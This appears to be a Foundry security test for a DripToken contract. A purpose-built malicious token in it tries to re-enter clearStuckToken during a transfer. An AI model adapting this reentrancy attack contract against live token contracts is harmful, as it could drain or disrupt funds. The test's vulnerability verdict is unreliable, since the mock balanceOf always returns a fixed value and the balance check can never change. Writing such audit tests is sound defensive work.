// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/DripToken.sol";

contract MaliciousToken {
    address public dripToken;
    uint256 public reentrantCalls;

    function setDripToken(address _dripToken) external {
        dripToken = _dripToken;
    }

    function balanceOf(address) external pure returns (uint256) {
        return 100 ether;
    }

    function transfer(address, uint256) external returns (bool) {
        if (reentrantCalls == 0) {
            reentrantCalls = 1;
            try DripToken(dripToken).clearStuckToken(address(this), 0) {
                // Call succeeded but we don't care
            } catch {
                // Call failed but we still count the attempt
            }
        }
        return true;
    }
}

contract DripTokenReentrancyTest is Test {
    DripToken public dripToken;
    MaliciousToken public maliciousToken;
    address owner = makeAddr("owner");
    
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant FACTORY = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address constant WETH = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    function setUp() public {
        vm.startPrank(owner);
        // Mock router and factory calls for token initialization
        vm.mockCall(
            ROUTER,
            abi.encodeWithSignature("factory()"),
            abi.encode(FACTORY)
        );
        vm.mockCall(
            ROUTER,
            abi.encodeWithSignature("WETH()"),
            abi.encode(WETH)
        );
        vm.mockCall(
            FACTORY,
            abi.encodeWithSignature("createPair(address,address)"),
            abi.encode(address(0x02))
        );
        
        dripToken = new DripToken();
        maliciousToken = new MaliciousToken();
        maliciousToken.setDripToken(address(dripToken));
        vm.stopPrank();
    }

    function testReentrancyInClearStuckToken() public {
        console2.log("--- BEFORE-Trigger Balance ---");
        uint256 initialBalance = maliciousToken.balanceOf(address(dripToken));
        console2.log("DripToken's MaliciousToken balance:", initialBalance);
        
        uint256 initialCount = maliciousToken.reentrantCalls();

        console2.log("--- Trigger clearStuckToken ---");
        vm.prank(owner);
        dripToken.clearStuckToken(address(maliciousToken), 0);
        uint256 finalCount = maliciousToken.reentrantCalls();
        
        console2.log("--- AFTER-Trigger Balance ---");
        uint256 finalBalance = maliciousToken.balanceOf(address(dripToken));
        console2.log("DripToken's MaliciousToken balance:", finalBalance);

        // Should have 1 attempt recorded (even if reentrant call fails)
        assertEq(finalCount, initialCount + 1, "Reentrant call attempt not recorded");

        // Vulnerability verdict based on balance change
        if (initialBalance == finalBalance) {
            console2.log("Vulnerability not Exist: MaliciousToken balance unchanged (remains %s)", finalBalance);
        } else {
            console2.log("Vulnerability Exists: MaliciousToken balance changed from %s to %s", initialBalance, finalBalance);
        }
    }
}